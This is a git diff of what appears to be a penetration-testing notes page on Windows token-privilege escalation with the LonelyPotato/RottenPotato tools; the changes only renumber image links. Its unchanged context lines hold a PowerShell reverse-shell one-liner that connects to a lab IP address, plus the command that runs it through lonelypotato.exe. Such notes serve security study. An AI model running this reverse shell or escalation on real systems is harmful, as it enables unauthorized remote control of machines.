@@ -6,11 +6,11 @@ https://github.com/decoder-it/lonelypotato/blob/master/RottenPotatoEXE/MSFRotten
 
 https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
 
-![](../.gitbook/assets/image%20%2835%29.png)
+![](../.gitbook/assets/image%20%2839%29.png)
 
 Example:
 
-![](../.gitbook/assets/image%20%2841%29.png)
+![](../.gitbook/assets/image%20%2845%29.png)
 
 ## shell.bat
 
@@ -24,7 +24,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 lonelypotato.exe t shell.bat
 ```
 
-![](../.gitbook/assets/image%20%2832%29.png)
+![](../.gitbook/assets/image%20%2836%29.png)
 
-![](../.gitbook/assets/image%20%2839%29.png)
+![](../.gitbook/assets/image%20%2843%29.png)
 
